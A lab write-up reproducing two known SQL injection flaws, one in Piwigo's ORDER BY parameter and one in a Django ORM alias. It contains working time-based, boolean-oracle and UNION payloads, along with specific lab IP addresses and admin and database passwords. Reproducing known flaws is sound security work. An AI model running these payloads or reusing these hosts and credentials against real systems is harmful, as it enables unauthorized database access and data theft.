# Case study: authenticated SQL injection and ORM alias injection

This study combines two authorized CVE reproductions against historical
internal-lab targets.

## Piwigo ORDER BY injection

Target family: Piwigo 12.2.0, CVE-2022-26266.

```text
HTTP: 183.238.63.200:45712
Database access: 183.238.63.200:45709
Challenge admin: admin / admin123456
Database account: piwigo / root / root
Flag: none present in the lab database
```

Authenticated API:

```text
/ws.php?format=json&method=pwg.users.getList
```

Baseline:

```text
order=id
```

Time-based check:

```text
order=id,(SELECT SLEEP(3))
```

Boolean oracle:

```text
order=IF((condition),id,-id)
```

When the condition is true, the first returned user id is `1`; otherwise the
reverse ordering moves a different record first.

The script performs:

- login;
- baseline timing;
- bounded metadata discovery;
- binary-search extraction using the boolean oracle.

See [`piwigo_order_by.py`](piwigo_order_by.py).

## Django CVE-2022-28346

The vulnerable demo expanded a user-controlled alias into:

```text
Target: 183.238.63.200:45714
Application: Django 3.2.11 / SQLite 3.34.1
Flag: none present in the reproduced database
```

```python
User.objects.annotate(**{field: Count("name")})
```

A field value such as:

```text
demo.name" FROM "demo_user"
union SELECT "1",sqlite_version(),"3" --
```

turned the generated query into a UNION injection.

The reproduction confirms:

- the baseline page;
- SQLite version reflection;
- `sqlite_master` enumeration.

See [`django_alias_union.py`](django_alias_union.py).

## Negative result

Both labs reproduced the vulnerability, but the databases did not contain a
challenge Flag. That is still a valid reproduction result. Do not convert a
successful injection into a "solved Flag" claim without a saved proof artifact.

These historical addresses may be offline or reassigned. Their inclusion is
evidence from the original authorized lab, not permission to test them.
